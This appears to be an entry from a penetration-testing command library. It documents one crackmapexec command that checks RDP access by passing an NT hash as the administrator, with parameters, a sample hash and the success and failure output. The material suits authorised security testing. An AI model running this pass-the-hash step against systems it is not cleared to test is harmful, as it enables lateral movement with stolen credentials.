---
id: 080a191c-c671-442f-9ac4-073b3038065b
type: command
executor: bash
data: 'crackmapexec rdp $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"'
output: null
created_at: '2023-04-06T03:56:30.721630+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
tags:
  - credential-testing
  - rdp
verified: true
validated: true
---

# crackmapexec-rdp-with-nt-hash

## Command

```bash
crackmapexec rdp $_TARGET_IP -u $_USERNAME -H ":$_NT_HASH"
```

## Description

Validates NT hash for Remote Desktop Protocol access, useful for confirming RDP usability before connecting.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_IP | Target IP | Yes |
| -u $_USERNAME | RDP username | Yes |
| -H ":$_NT_HASH" | NT hash | Yes |
| rdp | RDP protocol (port 3389) | Built-in |

## Examples

### Basic Usage

```bash
crackmapexec rdp 192.168.1.100 -u Administrator -H ":31d6cfe0d16ae931b73c59d7e0c089c0"
```

## Expected Output

Success:

RDP                 192.168.1.100:3389    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [+] corp\administrator (Pwn3d!)

Failure:

RDP                 192.168.1.100:3389    100       administrator:31d6cfe0d16ae931b73c59d7e0c089c0               [-] STATUS: LOGON_FAILURE CredSSP required

## Related

- [[procedures/Test-Credentials-Against-Multiple-Protocols-with-CrackMapExec]]
